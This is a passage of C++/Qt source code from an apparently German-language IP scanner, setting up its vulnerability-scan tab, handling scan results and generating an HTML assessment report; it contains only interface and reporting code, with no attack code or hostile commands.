\"SUCCESS\");\r\n}\r\nvoid IpScanner::createVulnerabilityTab()\r\n{\r\n    vulnerabilityTab = new QWidget();\r\n    mainTabWidget->addTab(vulnerabilityTab, \"🔒 Vulnerability Scanner\");\r\n\r\n    QHBoxLayout *layout = new QHBoxLayout(vulnerabilityTab);\r\n\r\n    // Left side: Configuration and control\r\n    QVBoxLayout *controlLayout = new QVBoxLayout();\r\n\r\n    // Target configuration\r\n    QGroupBox *targetGroup = new QGroupBox(\"🎯 Ziel Konfiguration\");\r\n    QGridLayout *targetLayout = new QGridLayout(targetGroup);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Ziel:\"), 0, 0);\r\n    vulnTargetEdit = new QLineEdit();\r\n    vulnTargetEdit->setPlaceholderText(\"IP-Adresse oder Hostname\");\r\n    targetLayout->addWidget(vulnTargetEdit, 0, 1, 1, 2);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Scan-Typ:\"), 1, 0);\r\n    vulnScanTypeCombo = new QComboBox();\r\n    vulnScanTypeCombo->addItems({\r\n        \"Schneller Vulnerability Scan\",\r\n        \"Umfassender Security Audit\",\r\n        \"SSL/TLS Focus Scan\",\r\n        \"Credential Testing Focus\",\r\n        \"Custom Scan\"\r\n    });\r\n    targetLayout->addWidget(vulnScanTypeCombo, 1, 1, 1, 2);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Timeout (ms):\"), 2, 0);\r\n    vulnTimeoutSpinBox = new QSpinBox();\r\n    vulnTimeoutSpinBox->setRange(1000, 30000);\r\n    vulnTimeoutSpinBox->setValue(5000);\r\n    vulnTimeoutSpinBox->setSuffix(\" ms\");\r\n    targetLayout->addWidget(vulnTimeoutSpinBox, 2, 1, 1, 2);\r\n\r\n    // Scan options\r\n    QGroupBox *optionsGroup = new QGroupBox(\"⚙️ Scan Optionen\");\r\n    QVBoxLayout *optionsLayout = new QVBoxLayout(optionsGroup);\r\n\r\n    enableCredentialTestsCheckBox = new QCheckBox(\"Credential Testing aktivieren\");\r\n    enableCredentialTestsCheckBox->setChecked(true);\r\n    enableCredentialTestsCheckBox->setToolTip(\"Testet auf schwache/Standard-Passwörter\");\r\n    optionsLayout->addWidget(enableCredentialTestsCheckBox);\r\n\r\n    enableSSLTestsCheckBox = new QCheckBox(\"SSL/TLS Vulnerability Tests\");\r\n    enableSSLTestsCheckBox->setChecked(true);\r\n    enableSSLTestsCheckBox->setToolTip(\"Prüft SSL-Zertifikate und Cipher-Suites\");\r\n    optionsLayout->addWidget(enableSSLTestsCheckBox);\r\n\r\n    enableServiceTestsCheckBox = new QCheckBox(\"Service-spezifische Tests\");\r\n    enableServiceTestsCheckBox->setChecked(true);\r\n    enableServiceTestsCheckBox->setToolTip(\"Testet bekannte Service-Vulnerabilities\");\r\n    optionsLayout->addWidget(enableServiceTestsCheckBox);\r\n\r\n    // Control buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n\r\n    startVulnScanButton = new QPushButton(\"🔒 Vulnerability Scan Starten\");\r\n    startVulnScanButton->setStyleSheet(\"QPushButton { background-color: #dc3545; font-size: 12px; font-weight: bold; } QPushButton:hover { background-color: #c82333; }\");\r\n\r\n    stopVulnScanButton = new QPushButton(\"⏹️ Scan Stoppen\");\r\n    stopVulnScanButton->setEnabled(false);\r\n    stopVulnScanButton->setStyleSheet(\"QPushButton { background-color: #6c757d; font-size: 12px; } QPushButton:hover { background-color: #545b62; }\");\r\n\r\n    exportVulnReportButton = new QPushButton(\"📊 Report Exportieren\");\r\n    exportVulnReportButton->setEnabled(false);\r\n    exportVulnReportButton->setStyleSheet(\"QPushButton { background-color: #28a745; font-size: 12px; } QPushButton:hover { background-color: #218838; }\");\r\n\r\n    buttonLayout->addWidget(startVulnScanButton);\r\n    buttonLayout->addWidget(stopVulnScanButton);\r\n    buttonLayout->addWidget(exportVulnReportButton);\r\n\r\n    // Progress and status\r\n    QGroupBox *progressGroup = new QGroupBox(\"📊 Scan Fortschritt\");\r\n    QVBoxLayout *progressLayout = new QVBoxLayout(progressGroup);\r\n\r\n    vulnerabilityProgressBar = new QProgressBar();\r\n    vulnerabilityProgressBar->setTextVisible(true);\r\n    vulnerabilityProgressBar->setFormat(\"Vulnerability Scan: %p%\");\r\n\r\n    vulnerabilityStatusLabel = new QLabel(\"Bereit für Vulnerability Scan\");\r\n    vulnerabilityStatusLabel->setStyleSheet(\"font-weight: bold; color: #28a745;\");\r\n\r\n    QHBoxLayout *statsLayout = new QHBoxLayout();\r\n    vulnerabilitiesFoundLabel = new QLabel(\"Vulnerabilities: 0\");\r\n    securityScoreLabel = new QLabel(\"Score: --\");\r\n    riskLevelLabel = new QLabel(\"Risk: --\");\r\n\r\n    vulnerabilitiesFoundLabel->setStyleSheet(\"color: #dc3545; font-weight: bold;\");\r\n    securityScoreLabel->setStyleSheet(\"color: #ffc107; font-weight: bold;\");\r\n    riskLevelLabel->setStyleSheet(\"color: #17a2b8; font-weight: bold;\");\r\n\r\n    statsLayout->addWidget(vulnerabilitiesFoundLabel);\r\n    statsLayout->addWidget(securityScoreLabel);\r\n    statsLayout->addWidget(riskLevelLabel);\r\n    statsLayout->addStretch();\r\n\r\n    progressLayout->addWidget(vulnerabilityProgressBar);\r\n    progressLayout->addWidget(vulnerabilityStatusLabel);\r\n    progressLayout->addLayout(statsLayout);\r\n\r\n    // Add to control layout\r\n    controlLayout->addWidget(targetGroup);\r\n    controlLayout->addWidget(optionsGroup);\r\n    controlLayout->addLayout(buttonLayout);\r\n    controlLayout->addWidget(progressGroup);\r\n    controlLayout->addStretch();\r\n\r\n    // Right side: Results display\r\n    QVBoxLayout *resultsLayout = new QVBoxLayout();\r\n\r\n    QLabel *resultsTitle = new QLabel(\"🔍 Vulnerability Results\");\r\n    resultsTitle->setStyleSheet(\"font-size: 14px; font-weight: bold; margin: 5px;\");\r\n\r\n    // Vulnerability results tree\r\n    vulnerabilityTreeWidget = new QTreeWidget();\r\n    vulnerabilityTreeWidget->setHeaderLabels({\r\n        \"Severity\", \"Vulnerability\", \"Service\", \"Port\", \"CVE Score\", \"Status\"\r\n    });\r\n    vulnerabilityTreeWidget->setColumnWidth(0, 80);   // Severity\r\n    vulnerabilityTreeWidget->setColumnWidth(1, 200);  // Vulnerability\r\n    vulnerabilityTreeWidget->setColumnWidth(2, 80);   // Service\r\n    vulnerabilityTreeWidget->setColumnWidth(3, 60);   // Port\r\n    vulnerabilityTreeWidget->setColumnWidth(4, 80);   // CVE Score\r\n    vulnerabilityTreeWidget->setColumnWidth(5, 100);  // Status\r\n\r\n    vulnerabilityTreeWidget->setAlternatingRowColors(true);\r\n    vulnerabilityTreeWidget->setSortingEnabled(true);\r\n    vulnerabilityTreeWidget->setRootIsDecorated(false);\r\n\r\n    // Details panel\r\n    QLabel *detailsTitle = new QLabel(\"📋 Vulnerability Details\");\r\n    detailsTitle->setStyleSheet(\"font-size: 12px; font-weight: bold; margin: 5px;\");\r\n\r\n    vulnerabilityDetailsEdit = new QTextEdit();\r\n    vulnerabilityDetailsEdit->setMaximumHeight(200);\r\n    vulnerabilityDetailsEdit->setReadOnly(true);\r\n\r\n    resultsLayout->addWidget(resultsTitle);\r\n    resultsLayout->addWidget(vulnerabilityTreeWidget, 3);\r\n    resultsLayout->addWidget(detailsTitle);\r\n    resultsLayout->addWidget(vulnerabilityDetailsEdit, 1);\r\n\r\n    // Add to main layout\r\n    QWidget *controlWidget = new QWidget();\r\n    controlWidget->setLayout(controlLayout);\r\n    controlWidget->setMaximumWidth(400);\r\n\r\n    QWidget *resultsWidget = new QWidget();\r\n    resultsWidget->setLayout(resultsLayout);\r\n\r\n    layout->addWidget(controlWidget, 1);\r\n    layout->addWidget(resultsWidget, 2);\r\n\r\n    // Connect signals\r\n    connect(startVulnScanButton, &QPushButton::clicked, this, &IpScanner::startVulnerabilitySccan);\r\n    connect(stopVulnScanButton, &QPushButton::clicked, this, &IpScanner::stopVulnerabilitySccan);\r\n    connect(exportVulnReportButton, &QPushButton::clicked, this, &IpScanner::exportVulnerabilityReport);\r\n\r\n    connect(vulnerabilityTreeWidget, &QTreeWidget::itemSelectionChanged,\r\n            this, &IpScanner::onVulnerabilitySelectionChanged);\r\n\r\n    // Auto-populate target from main scan if available\r\n    connect(targetEdit, &QLineEdit::textChanged, [this](const QString &text) {\r\n        if (vulnTargetEdit->text().isEmpty()) {\r\n            vulnTargetEdit->setText(text);\r\n        }\r\n    });\r\n}\r\nvoid IpScanner::startVulnerabilitySccan()\r\n{\r\n    QString target = vulnTargetEdit->text().trimmed();\r\n    if (target.isEmpty()) {\r\n        QMessageBox::warning(this, \"⚠️ Warnung\", \"Bitte geben Sie ein Ziel für den Vulnerability Scan ein!\");\r\n        return;\r\n    }\r\n\r\n    // Clear previous results\r\n    clearVulnerabilityResults();\r\n\r\n    // Update UI state\r\n    vulnerabilityScanRunning = true;\r\n    startVulnScanButton->setEnabled(false);\r\n    stopVulnScanButton->setEnabled(true);\r\n    exportVulnReportButton->setEnabled(false);\r\n\r\n    vulnerabilityStatusLabel->setText(\"🔄 Vulnerability Scan läuft...\");\r\n    vulnerabilityStatusLabel->setStyleSheet(\"font-weight: bold; color: #ffc107;\");\r\n\r\n    addLogEntry(QString(\"Vulnerability Scan gestartet für: %1\").arg(target), \"INFO\");\r\n\r\n    // Create and configure vulnerability scanner\r\n    VulnerabilityScanner *scanner = new VulnerabilityScanner(target);\r\n\r\n    // Configure scanner based on UI settings\r\n    scanner->setTimeout(vulnTimeoutSpinBox->value());\r\n    scanner->enableCredentialTesting(enableCredentialTestsCheckBox->isChecked());\r\n    scanner->enableSSLTesting(enableSSLTestsCheckBox->isChecked());\r\n    scanner->enableServiceTesting(enableServiceTestsCheckBox->isChecked());\r\n\r\n    // Connect scanner signals\r\n    connect(scanner, &VulnerabilityScanner::scanStarted,\r\n            [this](const QString &target) {\r\n                vulnerabilityStatusLabel->setText(QString(\"🔍 Scanne %1...\").arg(target));\r\n            });\r\n\r\n    connect(scanner, &VulnerabilityScanner::scanProgress,\r\n            this, &IpScanner::onVulnerabilityScanProgress);\r\n\r\n    connect(scanner, &VulnerabilityScanner::statusUpdate,\r\n            this, &IpScanner::onVulnerabilityScanStatusUpdate);\r\n\r\n    connect(scanner, &VulnerabilityScanner::vulnerabilityFound,\r\n            this, &IpScanner::onVulnerabilityFound);\r\n\r\n    connect(scanner, &VulnerabilityScanner::assessmentComplete,\r\n            this, &IpScanner::onSecurityAssessmentComplete);\r\n\r\n    connect(scanner, &VulnerabilityScanner::scanCompleted,\r\n            [this](const QString &target) {\r\n                Q_UNUSED(target)\r\n                vulnerabilityScanRunning = false;\r\n                startVulnScanButton->setEnabled(true);\r\n                stopVulnScanButton->setEnabled(false);\r\n                exportVulnReportButton->setEnabled(true);\r\n\r\n                vulnerabilityStatusLabel->setText(\"✅ Vulnerability Scan abgeschlossen\");\r\n                vulnerabilityStatusLabel->setStyleSheet(\"font-weight: bold; color: #28a745;\");\r\n            });\r\n\r\n    connect(scanner, &VulnerabilityScanner::errorOccurred,\r\n            [this](const QString &target, const QString &error) {\r\n                addLogEntry(QString(\"Vulnerability Scan Fehler für %1: %2\").arg(target, error), \"ERROR\");\r\n                QMessageBox::warning(this, \"❌ Scan Fehler\",\r\n                                     QString(\"Fehler beim Scannen von %1:\\n%2\").arg(target, error));\r\n            });\r\n\r\n    // Start the scanner\r\n    threadPool->start(scanner);\r\n}\r\n\r\nvoid IpScanner::stopVulnerabilitySccan()\r\n{\r\n    vulnerabilityScanRunning = false;\r\n    startVulnScanButton->setEnabled(true);\r\n    stopVulnScanButton->setEnabled(false);\r\n\r\n    vulnerabilityStatusLabel->setText(\"🛑 Vulnerability Scan gestoppt\");\r\n    vulnerabilityStatusLabel->setStyleSheet(\"font-weight: bold; color: #dc3545;\");\r\n\r\n    addLogEntry(\"Vulnerability Scan vom Benutzer gestoppt\", \"WARNING\");\r\n}\r\n\r\nvoid IpScanner::onVulnerabilityFound(const QString &target, const VulnerabilityInfo &vuln)\r\n{\r\n    Q_UNUSED(target)\r\n\r\n    // Add to discovered vulnerabilities list\r\n    discoveredVulnerabilities.append(vuln);\r\n\r\n    // Add to tree widget\r\n    QTreeWidgetItem *item = new QTreeWidgetItem();\r\n\r\n    // Set severity with color coding\r\n    QString severityText;\r\n    QColor severityColor;\r\n    switch (vuln.severity) {\r\n    case VulnSeverity::CRITICAL:\r\n        severityText = \"🔴 CRITICAL\";\r\n        severityColor = QColor(220, 53, 69, 150);\r\n        break;\r\n    case VulnSeverity::HIGH:\r\n        severityText = \"🟠 HIGH\";\r\n        severityColor = QColor(255, 193, 7, 150);\r\n        break;\r\n    case VulnSeverity::MEDIUM:\r\n        severityText = \"🟡 MEDIUM\";\r\n        severityColor = QColor(255, 165, 0, 150);\r\n        break;\r\n    case VulnSeverity::LOW:\r\n        severityText = \"🟢 LOW\";\r\n        severityColor = QColor(40, 167, 69, 150);\r\n        break;\r\n    case VulnSeverity::INFO:\r\n        severityText = \"ℹ️ INFO\";\r\n        severityColor = QColor(23, 162, 184, 150);\r\n        break;\r\n    }\r\n\r\n    item->setText(0, severityText);\r\n    item->setText(1, vuln.title);\r\n    item->setText(2, vuln.service);\r\n    item->setText(3, QString::number(vuln.port));\r\n    item->setText(4, vuln.cveScore.isEmpty() ? \"N/A\" : vuln.cveScore);\r\n    item->setText(5, vuln.exploitable ? \"⚠️ Exploitable\" : \"📋 Detected\");\r\n\r\n    // Color code the entire row based on severity\r\n    for (int col = 0; col < 6; col++) {\r\n        item->setBackground(col, severityColor);\r\n    }\r\n\r\n    vulnerabilityTreeWidget->addTopLevelItem(item);\r\n\r\n    // Update statistics\r\n    int vulnCount = discoveredVulnerabilities.size();\r\n    vulnerabilitiesFoundLabel->setText(QString(\"Vulnerabilities: %1\").arg(vulnCount));\r\n\r\n    // Log the vulnerability\r\n    addLogEntry(QString(\"Vulnerability gefunden: %1 (%2) - %3\")\r\n                    .arg(vuln.title, vuln.service, severityText),\r\n                vuln.severity == VulnSeverity::CRITICAL || vuln.severity == VulnSeverity::HIGH ? \"WARNING\" : \"INFO\");\r\n}\r\nvoid IpScanner::onSecurityAssessmentComplete(const SecurityAssessment &assessment)\r\n{\r\n    lastAssessment = assessment;\r\n\r\n    // Update security score and risk level\r\n    securityScoreLabel->setText(QString(\"Score: %1/100\").arg(assessment.securityScore));\r\n    riskLevelLabel->setText(QString(\"Risk: %1\").arg(assessment.overallRisk));\r\n\r\n    // Color code risk level\r\n    QString riskColor;\r\n    if (assessment.overallRisk == \"CRITICAL\") {\r\n        riskColor = \"color: #dc3545; font-weight: bold;\";\r\n    } else if (assessment.overallRisk == \"HIGH\") {\r\n        riskColor = \"color: #fd7e14; font-weight: bold;\";\r\n    } else if (assessment.overallRisk == \"MEDIUM\") {\r\n        riskColor = \"color: #ffc107; font-weight: bold;\";\r\n    } else {\r\n        riskColor = \"color: #28a745; font-weight: bold;\";\r\n    }\r\n    riskLevelLabel->setStyleSheet(riskColor);\r\n\r\n    // Auto-resize columns\r\n    for (int i = 0; i < vulnerabilityTreeWidget->columnCount(); ++i) {\r\n        vulnerabilityTreeWidget->resizeColumnToContents(i);\r\n    }\r\n\r\n    // Show summary message\r\n    QString summaryMessage = QString(\r\n                                 \"🔒 Security Assessment Abgeschlossen\\n\\n\"\r\n                                 \"📊 Ergebnisse:\\n\"\r\n                                 \"• Vulnerabilities gefunden: %1\\n\"\r\n                                 \"• Critical: %2, High: %3, Medium: %4\\n\"\r\n                                 \"• Security Score: %5/100\\n\"\r\n                                 \"• Risk Level: %6\\n\\n\"\r\n                                 \"💡 Detaillierte Informationen finden Sie im Vulnerability Tab.\"\r\n                                 ).arg(assessment.totalVulnerabilities)\r\n                                 .arg(assessment.criticalCount)\r\n                                 .arg(assessment.highCount)\r\n                                 .arg(assessment.mediumCount)\r\n                                 .arg(assessment.securityScore)\r\n                                 .arg(assessment.overallRisk);\r\n\r\n    addLogEntry(QString(\"Security Assessment abgeschlossen - %1 Vulnerabilities, Score: %2, Risk: %3\")\r\n                    .arg(assessment.totalVulnerabilities)\r\n                    .arg(assessment.securityScore)\r\n                    .arg(assessment.overallRisk), \"SUCCESS\");\r\n\r\n    // Show summary dialog if critical vulnerabilities found\r\n    if (assessment.criticalCount > 0) {\r\n        QMessageBox::warning(this, \"⚠️ Kritische Vulnerabilities gefunden!\", summaryMessage);\r\n    } else {\r\n        QMessageBox::information(this, \"✅ Security Assessment\", summaryMessage);\r\n    }\r\n}\r\n\r\nvoid IpScanner::onVulnerabilityScanProgress(const QString &target, int percentage)\r\n{\r\n    Q_UNUSED(target)\r\n    vulnerabilityProgressBar->setValue(percentage);\r\n}\r\n\r\nvoid IpScanner::onVulnerabilityScanStatusUpdate(const QString &target, const QString &message)\r\n{\r\n    Q_UNUSED(target)\r\n    vulnerabilityStatusLabel->setText(message);\r\n}\r\n\r\nvoid IpScanner::onVulnerabilitySelectionChanged()\r\n{\r\n    QTreeWidgetItem *currentItem = vulnerabilityTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        vulnerabilityDetailsEdit->clear();\r\n        return;\r\n    }\r\n\r\n    QString vulnTitle = currentItem->text(1);\r\n\r\n    // Find the corresponding vulnerability\r\n    VulnerabilityInfo selectedVuln;\r\n    for (const VulnerabilityInfo &vuln : discoveredVulnerabilities) {\r\n        if (vuln.title == vulnTitle) {\r\n            selectedVuln = vuln;\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (selectedVuln.title.isEmpty()) {\r\n        vulnerabilityDetailsEdit->clear();\r\n        return;\r\n    }\r\n\r\n    // Display detailed information\r\n    QString details = QString(R\"(\r\n<h3>🔒 Vulnerability Details</h3>\r\n<table border=\"0\" cellpadding=\"3\">\r\n<tr><td><b>🆔 ID:</b></td><td>%1</td></tr>\r\n<tr><td><b>📋 Title:</b></td><td>%2</td></tr>\r\n<tr><td><b>⚠️ Severity:</b></td><td>%3</td></tr>\r\n<tr><td><b>🔧 Service:</b></td><td>%4</td></tr>\r\n<tr><td><b>🔌 Port:</b></td><td>%5</td></tr>\r\n<tr><td><b>📊 CVE Score:</b></td><td>%6</td></tr>\r\n<tr><td><b>🕐 Discovered:</b></td><td>%7</td></tr>\r\n</table>\r\n\r\n<h4>📝 Description:</h4>\r\n<p>%8</p>\r\n\r\n<h4>🔍 Evidence:</h4>\r\n<p>%9</p>\r\n\r\n<h4>💡 Recommendation:</h4>\r\n<p>%10</p>\r\n\r\n<h4>⚠️ Exploit Information:</h4>\r\n<p><b>Exploitable:</b> %11</p>\r\n<p><b>Method:</b> %12</p>\r\n    )\").arg(selectedVuln.id)\r\n                          .arg(selectedVuln.title)\r\n                          .arg(currentItem->text(0))\r\n                          .arg(selectedVuln.service)\r\n                          .arg(selectedVuln.port)\r\n                          .arg(selectedVuln.cveScore.isEmpty() ? \"N/A\" : selectedVuln.cveScore)\r\n                          .arg(selectedVuln.discovered.toString(\"dd.MM.yyyy hh:mm:ss\"))\r\n                          .arg(selectedVuln.description)\r\n                          .arg(selectedVuln.evidence)\r\n                          .arg(selectedVuln.recommendation)\r\n                          .arg(selectedVuln.exploitable ? \"⚠️ Yes\" : \"✅ No\")\r\n                          .arg(selectedVuln.exploitMethod.isEmpty() ? \"N/A\" : selectedVuln.exploitMethod);\r\n\r\n    vulnerabilityDetailsEdit->setHtml(details);\r\n}\r\n\r\nvoid IpScanner::clearVulnerabilityResults()\r\n{\r\n    vulnerabilityTreeWidget->clear();\r\n    vulnerabilityDetailsEdit->clear();\r\n    discoveredVulnerabilities.clear();\r\n\r\n    vulnerabilityProgressBar->setValue(0);\r\n    vulnerabilitiesFoundLabel->setText(\"Vulnerabilities: 0\");\r\n    securityScoreLabel->setText(\"Score: --\");\r\n    riskLevelLabel->setText(\"Risk: --\");\r\n\r\n    vulnerabilityStatusLabel->setText(\"Bereit für Vulnerability Scan\");\r\n    vulnerabilityStatusLabel->setStyleSheet(\"font-weight: bold; color: #28a745;\");\r\n}\r\n\r\nvoid IpScanner::exportVulnerabilityReport()\r\n{\r\n    if (discoveredVulnerabilities.isEmpty()) {\r\n        QMessageBox::information(this, \"📊 Export\", \"Keine Vulnerability-Daten zum Exportieren vorhanden\");\r\n        return;\r\n    }\r\n\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"📊 Vulnerability Report Exportieren\",\r\n                                                    QString(\"vulnerability_report_%1.html\")\r\n                                                        .arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"HTML Files (*.html);;JSON Files (*.json);;PDF Files (*.pdf)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    // Generate and save the report\r\n    generateVulnerabilityReport(fileName);\r\n}\r\nvoid IpScanner::generateVulnerabilityReport(const QString &fileName)\r\n{\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {\r\n        QMessageBox::warning(this, \"❌ Export Fehler\", \"Datei konnte nicht zum Schreiben geöffnet werden\");\r\n        return;\r\n    }\r\n\r\n    QTextStream stream(&file);\r\n\r\n    if (fileName.endsWith(\".html\")) {\r\n        generateHTMLVulnerabilityReport(stream);\r\n    } else if (fileName.endsWith(\".json\")) {\r\n        generateJSONVulnerabilityReport(stream);\r\n    }\r\n\r\n    file.close();\r\n\r\n    addLogEntry(QString(\"Vulnerability Report exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    QMessageBox::information(this, \"✅ Export Erfolgreich\",\r\n                             QString(\"Vulnerability Report erfolgreich exportiert:\\n%1\\n\\n📊 %2 Vulnerabilities dokumentiert\")\r\n                                 .arg(fileName).arg(discoveredVulnerabilities.size()));\r\n}\r\nvoid IpScanner::generateHTMLVulnerabilityReport(QTextStream &stream)\r\n{\r\n    QString target = vulnTargetEdit->text();\r\n    QDateTime reportTime = QDateTime::currentDateTime();\r\n\r\n    stream << R\"(<!DOCTYPE html>\r\n<html>\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>Vulnerability Assessment Report</title>\r\n    <style>\r\n        body {\r\n            font-family: 'Segoe UI', Arial, sans-serif;\r\n            background: linear-gradient(135deg, #1e1e1e, #2d2d2d);\r\n            color: #fff;\r\n            margin: 0;\r\n            padding: 20px;\r\n            line-height: 1.6;\r\n        }\r\n        .container { max-width: 1200px; margin: 0 auto; background: #2d2d2d; border-radius: 10px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }\r\n        .header { background: linear-gradient(135deg, #dc3545, #c82333); padding: 30px; text-align: center; }\r\n        .header h1 { margin: 0; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }\r\n        .header .subtitle { font-size: 1.2em; margin-top: 10px; opacity: 0.9; }\r\n        .summary { padding: 30px; background: #343a40; }\r\n        .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 20px; }\r\n        .summary-card { background: #495057; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid; }\r\n        .summary-card.critical { border-left-color: #dc3545; }\r\n        .summary-card.high { border-left-color: #fd7e14; }\r\n        .summary-card.medium { border-left-color: #ffc107; }\r\n        .summary-card.low { border-left-color: #28a745; }\r\n        .summary-card h3 { margin: 0 0 10px 0; font-size: 2em; }\r\n        .summary-card p { margin: 0; font-size: 0.9em; opacity: 0.8; }\r\n        .content { padding: 30px; }\r\n        .vulnerability { margin: 20px 0; background: #404040; border-radius: 8px; padding: 20px; border-left: 5px solid; }\r\n        .vulnerability.critical { border-left-color: #dc3545; }\r\n        .vulnerability.high { border-left-color: #fd7e14; }\r\n        .vulnerability.medium { border-left-color: #ffc107; }\r\n        .vulnerability.low { border-left-color: #28a745; }\r\n        .vulnerability.info { border-left-color: #17a2b8; }\r\n        .vuln-header { display: flex; justify-content: between; align-items: center; margin-bottom: 15px; }\r\n        .vuln-title { font-size: 1.3em; font-weight: bold; margin: 0; }\r\n        .vuln-severity { padding: 5px 15px; border-radius: 20px; font-size: 0.8em; font-weight: bold; text-transform: uppercase; }\r\n        .severity-critical { background: #dc3545; color: white; }\r\n        .severity-high { background: #fd7e14; color: white; }\r\n        .severity-medium { background: #ffc107; color: black; }\r\n        .severity-low { background: #28a745; color: white; }\r\n        .severity-info { background: #17a2b8; color: white; }\r\n        .vuln-details { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 15px 0; }\r\n        .detail-item { background: #343a40; padding: 10px; border-radius: 5px; }\r\n        .detail-label { font-weight: bold; color: #adb5bd; font-size: 0.9em; }\r\n        .detail-value { margin-top: 5px; }\r\n        .recommendation { background: #1e7e34; padding: 15px; border-radius: 5px; margin-top: 15px; }\r\n        .recommendation h4 { margin: 0 0 10px 0; color: #fff; }\r\n        .exploitable { background: #721c24; padding: 10px; border-radius: 5px; margin-top: 10px; }\r\n        .not-exploitable { background: #155724; padding: 10px; border-radius: 5px; margin-top: 10px; }\r\n        .footer { background: #1a1a1a; padding: 20px; text-align: center; color: #6c757d; }\r\n        .risk-indicator { display: inline-block; padding: 10px 20px; border-radius: 25px; font-weight: bold; margin: 10px; }\r\n        .risk-critical { background: #dc3545; color: white; }\r\n        .risk-high { background: #fd7e14; color: white; }\r\n        .risk-medium { background: #ffc107; color: black; }\r\n        .risk-low { background: #28a745; color: white; }\r\n        @media print { body { background: white; color: black; } .container { box-shadow: none; } }\r\n    </style>\r\n</head>\r\n<body>\r\n    <div class=\"container\">\r\n        <div class=\"header\">\r\n            <h1>🔒 Security Vulnerability Assessment</h1>\r\n            <div class=\"subtitle\">Comprehensive Security Analysis Report</div>\r\n        </div>\r\n\r\n        <div class=\"summary\">\r\n            <h2>📊 Executive Summary</h2>\r\n            <p><strong>Target:</strong> )\" << target << R\"(</p>\r\n            <p><strong>Scan Date:</strong> )\" << reportTime.toString(\"dd.MM.yyyy hh:mm:ss\") << R\"(</p>\r\n            <p><strong>Scanner:</strong> Advanced IP Scanner v2.0 - Vulnerability Module</p>\r\n\r\n            <div class=\"summary-grid\">\r\n                <div class=\"summary-card critical\">\r\n                    <h3>)\" << lastAssessment.criticalCount << R\"(</h3>\r\n                    <p>Critical Vulnerabilities</p>\r\n                </div>\r\n                <div class=\"summary-card high\">\r\n                    <h3>)\" << lastAssessment.highCount << R\"(</h3>\r\n                    <p>High Vulnerabilities</p>\r\n                </div>\r\n                <div class=\"summary-card medium\">\r\n                    <h3>)\" << lastAssessment.mediumCount << R\"(</h3>\r\n                    <p>Medium Vulnerabilities</p>\r\n                </div>\r\n                <div class=\"summary-card low\">\r\n                    <h3>)\" << lastAssessment.lowCount << R\"(</h3>\r\n                    <p>Low/Info Vulnerabilities</p>\r\n                </div>\r\n            </div>\r\n\r\n            <div style=\"text-align: center; margin: 20px 0;\">\r\n                <div class=\"risk-indicator risk-)\" << lastAssessment.overallRisk.toLower() << R\"(\">\r\n                    Overall Risk Level: )\" << lastAssessment.overallRisk << R\"(\r\n                </div>\r\n                <div style=\"margin-top: 10px;\">\r\n                    <strong>Security Score: )\" << lastAssessment.securityScore << R\"(/100</strong>\r\n                </div>\r\n            </div>\r\n\r\n            <h3>🎯 Key Findings:</h3>\r\n            <ul>\r\n                <li><strong>Total Vulnerabilities Found:</strong> )\" << lastAssessment.totalVulnerabilities << R\"(</li>\r\n                <li><strong>Weak Credentials:</strong> )\" << (lastAssessment.hasWeakCredentials ? \"⚠️ Detected\" : \"✅ None Found\") << R\"(</li>\r\n                <li><strong>Unencrypted Services:</strong> )\" << (lastAssessment.hasUnencryptedServices ? \"⚠️ Present\" : \"✅ None Found\") << R\"(</li>\r\n                <li><strong>Outdated Software:</strong> )\" << (lastAssessment.hasOutdatedSoftware ? \"⚠️ Detected\" : \"✅ Up to Date\") << R\"(</li>\r\n                <li><strong>Operating System:</strong> )\" << lastAssessment.operatingSystem << R\"(</li>\r\n            </ul>\r\n        </div>\r\n\r\n        <div class=\"content\">\r\n            <h2>🔍 Detailed Vulnerability Analysis</h2>)\";\r\n\r\n    // Add each vulnerability\r\n    for (const VulnerabilityInfo &vuln : discoveredVulnerabilities) {\r\n        QString severityClass, severityText;\r\n        switch (vuln.severity) {\r\n        case VulnSeverity::CRITICAL:\r\n            severityClass = \"critical\"; severityText = \"CRITICAL\"; break;\r\n        case VulnSeverity::HIGH:\r\n            severityClass = \"high\"; severityText = \"HIGH\"; break;\r\n        case VulnSeverity::MEDIUM:\r\n            severityClass = \"medium\"; severityText = \"MEDIUM\"; break;\r\n        case VulnSeverity::LOW:\r\n            severityClass = \"low\"; severityText = \"LOW\"; break;\r\n        case VulnSeverity::INFO:\r\n            severityClass = \"info\"; severityText = \"INFO\"; break;\r\n        }\r\n\r\n        stream << R\"(\r\n            <div class=\"vulnerability )\" << severityClass << R\"(\">\r\n                <div class=\"vuln-header\">\r\n                    <h3 class=\"vuln-title\">)\" << vuln.title << R\"(</h3>\r\n                    <span class=\"vuln-severity severity-)\" << severityClass << R\"(\">)\" << severityText << R\"(</span>\r\n                </div>\r\n\r\n                <div class=\"vuln-details\">\r\n                    <div class=\"detail-item\">\r\n                        <div class=\"detail-label\">Service</div>\r\n                        <div class=\"detail-value\">)\" << vuln.service << R\"(</div>\r\n                    </div>\r\n                    <div class=\"detail-item\">\r\n                        <div class=\"detail-label\">Port</div>\r\n                        <div class=\"detail-value\">)\" << vuln.port << R\"(</div>\r\n                    </div>\r\n                    <div class=\"detail-item\">\r\n                        <div class=\"detail-label\">CVE Score</div>\r\n                        <div class=\"detail-value\">)\" << (vuln.cveScore.isEmpty() ? \"N/A\" : vuln.cveScore) << R\"(</div>\r\n                    </div>\r\n                    <div class=\"detail-item\">\r\n                        <div class=\"detail-label\">Discovered</div>\r\n                        